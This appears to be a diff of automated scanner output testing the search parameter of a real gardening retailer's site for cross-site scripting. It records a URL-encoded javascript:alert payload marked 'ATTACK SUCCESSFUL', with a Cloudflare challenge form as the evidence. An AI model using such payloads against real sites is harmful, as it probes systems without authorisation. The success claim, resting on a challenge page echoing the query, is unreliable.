@@ -1,4 +1,4 @@
-https://www.burpee.com/gardening-supplies/
+https://www.burpee.com/mixandmatch
 
 GET Params:[1]
 ['q']
@@ -77,4 +77,4 @@ URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleR
 
 => ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
 Detection of Payload: 
-<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=cdf9320b31714eee1c3f2cabc13cbfe43b30bfbb-1586151419-0-AcOTaFSqy9ek-zRJCJWFZ2NN4OUiGS8U-_yPb-xkY9QnzRDp7PCcMm1GsTF90NeA9Bw6LAzj-7yR-Hx6j0qhpOSWSjtxJeYD6T66q7qLmK6kKCAynL2Zi0r4XIwHisdneMHFIrzyoK5Z3MH5hl8p44jElOg3L40ARezN51sZFJJOThmFavWXU93Y_esCG6GaLWL1rkBqMFu_3uH7tBwriYdvKV_byKPHt4Rd6-rWOzOiXtvvpQVUTS3jMnMlCakPPd18V2-NG03D5TwlufUc9sDhMNKkeKTWPBMZHbYU8R9GFJtoR59w1ZLx0SRBEpBcxWZJ9UluMu9Q9Ix1j5R6gKl0J490BxaRPdmOFJtbEjEkjBJn2JKsAxKqzHrlsRNZeVjZ0VYYGQaf-dJUBaSNX61OZnCgbYdFBtySvy3rP-sGh-tpB2Ta9W-KCD5P2w9EBO0c7l06YFN8wnF4I35lhfWT0t1oKuuXTsGCeMJcNEnloSd4dn0NXkl-eLBJ9DRiotzacMhYAJapA17z445UyiOv07EQk5lbBbqtIXZiy8MQMaBY4GMqFHP2oCIX6X_3ki3GkddSn2-aBRn9A6VMIWQ" method="POST" enctype="application/x-www-form-urlencoded">
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=ee10bb594cf4e48e788cf2487c754979b3dabf01-1586151451-0-Afzw2AwpoP8vYMHp0BZDHMaI2mDqbOnZxrnG5vI9EyG3scCKtbLKs4g6mwGDo0XpqLFvMfLscq09Oa5hum78Jbv91VJ8iabgjhSQYYQX7B2I5xbFFvsWOzU-jrSkLHvGmmpnt4Dhv-g2tO859E2_IrJcSoD8YnocsYbgUQ_n_i00lrDEVfxoEOUzm9Nq-9_TX5AKqhDqiMQ695swKNkkX6Lgdf7O92fNozUud4Qc5mzoYlWBG_29rqtO5AUdnh89vybIdlYsgd-tDL59lElXqUZwc2TiHgc0Bf1Lr9qwCWmhA2NS9n-W0N406lGlxcdaJcZOinEvnNAMsIVdgIfSvnbQcCljX-X7Iq5oSZxCx-EOc4WARb2xyDWbgjShA0-33gihoXaW-s7Hv1VTpU9HmAHjFs8Hn1MNPrqZLcIy2jFaUfb5k-Y9kNCjSjsZSd5d6qMsa3NX23dMrJLDyVH6J-kKR2OtQt_wBqWkJvuznIo5C4HE-oLSCJqbD5_NKZhuhZPZDA2Gh91ikWSWE_SMfh0ib8EMCeViczCyF-LP3cSqIXnv83MctZtD-3XvuqZ8kh_wHXvgag3S5M8V_-SolvE" method="POST" enctype="application/x-www-form-urlencoded">
